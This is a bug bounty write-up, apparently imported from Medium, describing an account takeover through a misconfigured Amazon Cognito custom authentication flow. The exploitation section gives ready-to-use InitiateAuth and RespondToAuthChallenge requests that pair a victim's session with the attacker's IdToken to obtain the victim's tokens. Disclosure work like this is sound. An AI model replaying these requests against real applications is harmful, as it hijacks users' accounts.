---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2022-10-13_fall-account-takeover-via-amazon-cognito-misconfiguration.md
original_filename: 2022-10-13_fall-account-takeover-via-amazon-cognito-misconfiguration.md
title: Fall account takeover via Amazon Cognito misconfiguration
category: documents
detected_topics:
- oauth
- sso
- jwt
- access-control
- mobile-security
- saml
tags:
- imported
- documents
- oauth
- sso
- jwt
- access-control
- mobile-security
- saml
language: en
raw_sha256: 1247e78a17f085657e2ffe50ebba1b182cc8da374785b856ec62e826ff163e99
text_sha256: 86ca763b7f435986f870c20790b4f8c0e3b49a0ebea614c6f011a5e53f94c241
ingested_at: '2026-06-28T07:32:15Z'
sensitivity: unknown
redactions_applied: false
---

# Fall account takeover via Amazon Cognito misconfiguration

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2022-10-13_fall-account-takeover-via-amazon-cognito-misconfiguration.md
- Source Type: markdown
- Detected Topics: oauth, sso, jwt, access-control, mobile-security, saml
- Ingested At: 2026-06-28T07:32:15Z
- Redactions Applied: False
- Raw SHA256: `1247e78a17f085657e2ffe50ebba1b182cc8da374785b856ec62e826ff163e99`
- Text SHA256: `86ca763b7f435986f870c20790b4f8c0e3b49a0ebea614c6f011a5e53f94c241`


## Content

---
title: "Fall account takeover via Amazon Cognito misconfiguration"
page_title: "Full account takeover via Amazon Cognito misconfiguration | by Hossam Ahmed | Medium"
url: "https://medium.com/@iknowhatodo/fall-account-takeover-via-amazon-cognito-misconfiguration-ba5975b06c24"
authors: ["Hossam Ahmed (@iknowhatodo0x01)"]
bugs: ["IDOR", "Account takeover"]
publication_date: "2022-10-13"
added_date: "2022-10-17"
source: "pentester.land/writeups.json"
original_index: 2047
scraped_via: "browseros"
---

# Fall account takeover via Amazon Cognito misconfiguration

Full account takeover via Amazon Cognito misconfiguration
Hossam Ahmed
Follow
10 min read
·
Oct 13, 2022

106

Hello reader,
I hope you are doing well. Today I want to talk about one of my findings. It was a public program and the bug is not fixed yet. So I am not going to include any information about the program here. Let’s call it redirect.com.

So redirect.com uses Amazon Cognito service as provides authentication, and authorization.

Clarifications:

First let’s get to know the Amazon Cognito service.

#What is Amazon Cognito?#

Simple and Secure User Sign-Up, Sign-In, and Access Control
Amazon Cognito provides authentication, authorization, and user management for web and mobile apps. The users can sign in directly with a user name and password, or through a third party such as Facebook, Amazon, Google or Apple.
The two main components of Amazon Cognito are user pools and identity pools. User pools are user directories that provide sign-up and sign-in options for the app users. Identity pools enable the developer to grant his users access to other AWS services. The developer can use identity pools and user pools separately or together.

#Common Amazon Cognito scenarios#

Authenticate with a user pool
The developer can enable users to authenticate with a user pool. An app users can sign in either directly through a user pool, or federate through a third-party identity provider (IdP). The user pool manages the overhead of handling the tokens that are returned from social sign-in through Facebook, Google, Amazon, and Apple, and from OpenID Connect (OIDC) and SAML IdPs. After a successful authentication, the web or mobile app will receive user pool tokens from Amazon Cognito. The developer can use those tokens to retrieve AWS credentials that allow his app to access other AWS services, or he might choose to use them to control access to his server-side resources, or to the Amazon API Gateway.
Access the server-side resources with a user pool*
After a successful user pool sign-in, the web or mobile app will receive user pool tokens from Amazon Cognito. The developer can use those tokens to control access to his server-side resources. he can also create user pool groups to manage permissions, and to represent different types of users.

#There are different ways for authentication flow#

I will explain two methods which are the focus of the attack scenario in this write-up.

Client-side authentication flow
The user enters their user name and password into the app.

2. The app calls the InitiateAuth operation with the user’s user name and Secure Remote Password (SRP) details.
This API operation returns the authentication parameters.

3. The app calls the RespondToAuthChallenge operation. If the call succeeds, Amazon Cognito returns the user’s tokens, and the authentication flow is complete.

If Amazon Cognito requires another challenge, the call to RespondToAuthChallenge returns no tokens. Instead, the call returns a session.

4. If RespondToAuthChallenge returns a session, the app calls RespondToAuthChallenge again, this time with the session and the challenge response (for example, MFA code).

Client-side authentication flow
Custom authentication flow

Amazon Cognito user pools also make it possible to use custom authentication flows, which can help the developer create a challenge/response-based authentication model using AWS Lambda triggers.

The custom authentication flow makes possible customized challenge and response cycles to meet different requirements. The flow starts with a call to the InitiateAuth API operation that indicates the type of authentication to use and provides any initial authentication parameters. Amazon Cognito responds to the InitiateAuth call with one of the following types of information:

1. A challenge for the user, along with a session and parameters.

2. An error if the user fails to authenticate.

3. ID, access, and refresh tokens if the supplied parameters in the InitiateAuth call are sufficient to sign the user in. (Typically the user or app must first answer a challenge, but the custom code must determine this.)

If Amazon Cognito responds to the InitiateAuth call with a challenge, the app gathers more input and calls the RespondToAuthChallenge operation. This call provides the challenge responses and passes it back the session. Amazon Cognito responds to the RespondToAuthChallenge call similarly to the InitiateAuth call. If the user has signed in, Amazon Cognito provides tokens, or if the user isn’t signed in, Amazon Cognito provides another challenge, or an error. If Amazon Cognito returns another challenge, the sequence repeats and the app calls RespondToAuthChallenge until the user successfully signs in or an error is returned.

*Custom authentication flow and challenges*

An app can initiate a custom authentication flow by calling InitiateAuth with CUSTOM_AUTH as the Authflow. With a custom authentication flow, three Lambda triggers control challenges and verification of the responses.

1. The DefineAuthChallenge Lambda trigger uses a session array of previous challenges and responses as input. It then generates the next challenge name and Booleans that indicate whether the user is authenticated and can be granted tokens. This Lambda trigger is a state machine that controls the user’s path through the challenges.

2. The CreateAuthChallenge Lambda trigger takes a challenge name as input and generates the challenge and parameters to evaluate the response. When DefineAuthChallenge returns CUSTOM_CHALLENGE as the next challenge, the authentication flow calls CreateAuthChallenge. The CreateAuthChallenge Lambda trigger passes the next type of challenge in the challenge metadata parameter.

3. The VerifyAuthChallengeResponse Lambda function evaluates the response and returns a Boolean to indicate if the response was valid.

A custom authentication flow can also use a combination of built-in challenges, such as SRP password verification and MFA through SMS. It can use custom challenges such as CAPTCHA or secret questions.

Press enter or click to view image in full size

#Using tokens with user pools#

[IdToken]
The ID token is a JSON web token (JWT) that contains claims about the identity of the authenticated user, such as name, email, and phone_number. The developer can use this identity information inside his application. The ID token can also be used to authenticate users to the resource servers or server applications. The developer can also use an ID token outside of the application with his web API operations. In those cases, he must verify the signature of the ID token before he can trust any claims inside the ID token.

The developer can set the ID token expiration to any value between 5 minutes and 1 day.

[AccessTokken]
The user pool access token contains claims about the authenticated user, a list of the user’s groups, and a list of scopes. The purpose of the access token is to authorize API operations in the context of the user in the user pool. For example, the developer can use the access token to grant his user access to add, change, or delete user attributes.

The developer can set the access token expiration to any value between 5 minutes and 1 day.

[RefreshToken]
The developer can use the refresh token to retrieve new ID and access tokens. By default, the refresh token expires 30 days after an application user signs into user pool. When the developer create an application for his user pool, he can set the application’s refresh token expiration to any value between 60 minutes and 10 years.

Recon:

The recon process is divided into three sections:
1. Use the program as a normal user.
2. Analyze requests and responses to understand the objectives of the program and the mechanism of action of each feature available in the program.
3. Develop an attack scenario based on the previous analysis.

Use the program as a normal user.

The penetration test will be limited to the scope of authentication and authorization, which are:
Sign-up, sign in and OAuth If it is available.

Get Hossam Ahmed’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Available in the program register a new account through email and password as well as through OAuth (Google Idp).

I created a new account in the program using email and password and didn’t notice anything that might be unfamiliar.
I registered through OAuth and noticed the following:
1. During the registration process and after the process of authenticating with the third party and granting access to the application there were some delays in accessing the account and this does not stem from the Internet connection.
2. After completing the registration process I noticed that there is no option to change the email or to unlink the Google account from the user’s account on the program. That’s when I decided to move on to the next step……

Analyze requests and responses to understand the objectives of the program.

In BurpSuite, I selected the requests related to the registration process through OAuth and highlighted them in a specific color so that I can analyze them individually without distracting from other requests.
The registration process through OAuth is as follows:

1. After clicking on the Google icon to register in the program, the user is transferred to Google until the authentication process is done, and then the process of granting access to the client (The target app).

Press enter or click to view image in full size

2. After the user pool receives the code from the third-party provider, this code is exchanged for tokens, and it is sent to the program.
- I decoded the JWT and noticed that the email has not yet been verified.

Press enter or click to view image in full size

3. The client generates an API call to an endpoint responsible for linking the username of the Google account with the program account.
This endpoint takes 2 parameters and the IdToken as part of the request headers.

Press enter or click to view image in full size

4. The targetApp does an extra step by fetching the IdToken and AccessToken after the email has been confirmed. This is done utilizing two requests:
First, by connecting to an endpoint “InitiateAuth” that takes a set of parameters in the form of the JSON format. This endpoint is responsible for fetching a valid session belonging to the user account and the challenge name created by the website developers through the AWS lambda trigger, and the username and email address of the user account.

Press enter or click to view image in full size

Second, the targetApp connects to the “RespondToAuthChallenge” endpoint which includes the session, the ChallengeName, and the username we got from the previous step with some additional parameters. If the session, username, and additional parameter “Answer” (IdToken) are validated, user-specific tokens will be returned in the httpResponse. (The session is associated with the username of the user and the IdToken)

Press enter or click to view image in full size

Develop an attack scenario based on the previous analysis.

One question came to my mind!

What happens if I fetch a valid session of another user and use it instead of my session with the IdToken of my account and the username of the user account?

The answer to this question came by manipulating the parameters of the request for the “RespondToAuthChallenge” operation, which eventually paid off.

By manipulating the parameter values for this request I found that:
1. The session is validated and linked to the username.
2. The validity of the IdToken is verified.
3. It is not checked if the IdToken is associated with this session and this username or not!

Press enter or click to view image in full size

Exploitation:

[Attacker perspective]

Attacker login to his account to get a valid “IdToken” belongs to his account.
The attacker sends a POST request to AWS “InitiateAuth” endpoint to retrieve a valid session belonging to the victim account. To do that, follow those steps:
In burpSuite repeater create a new window and put this POST request:
POST / HTTP/2
Host: cognito-idp.us-east-1.amazonaws.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://redirect.com/
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.InitiateAuth
X-Amz-User-Agent: aws-amplify/5.0.4 js
Content-Length: 155
Origin: https://redirect.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers

{"AuthFlow":"CUSTOM_AUTH","ClientId":"targetAppClientId","AuthParameters":{"USERNAME":"XXXXXXXXXXXXXXXXXXX"},"ClientMetadata":{}}
Put the victim’s email as a value of the USERNAME parameter
In response, you will see this response body:
{"ChallengeName":"CUSTOM_CHALLENGE","ChallengeParameters":{"USERNAME":"VICTIM_USERNAME","email":"Victim's email"},"Session":"Victim's session"}

3. The attacker sends a POST request to AWS {RespondToAuthChallenge} endpoint to retrieve valid tokens belonging to the victim’s account although using an IdToken for the attacker’s account. To do that, follow those steps:

In burpSuite repeater create another window and put this POST request:
POST / HTTP/2
Host: cognito-idp.us-east-1.amazonaws.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://redirect.com/
Content-Type: application/x-amz-json-1.1
X-Amz-Target: AWSCognitoIdentityProviderService.RespondToAuthChallenge
X-Amz-User-Agent: aws-amplify/5.0.4 js
Content-Length: 2385
Origin: https://redirect.com
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: cross-site
Te: trailers

{"ChallengeName":"CUSTOM_CHALLENGE","ChallengeResponses":{"USERNAME":"VICTIM-USERNAME","ANSWER":"ATTACKER_IdToken"},"ClientId":"targetAppClientId","Session":"VICTIM'S_SESSION"}
Put the victim’s username as a value of the USERNAME parameter
Put the attacker’s IdToken as a value of an ANSWER parameter. (The attacker’s IdToken should be valid)
Put the victim’s session which you got from the previous request as a value of the SESSION parameter.
In response you will see this response body:
{"AuthenticationResult":{"AccessToken":"VICTIM'S-AccessToken","ExpiresIn":3600,"IdToken":"VICTIM'S_IdToken","RefreshToken":"VICTIM'S_RefreshToken","TokenType":"Bearer"},"ChallengeParameters":{}}

“Our mission is making the internet safe.”

I hope you enjoyed reading, Thanks.

Follow me on Twitter: @iknowhatodo0x01
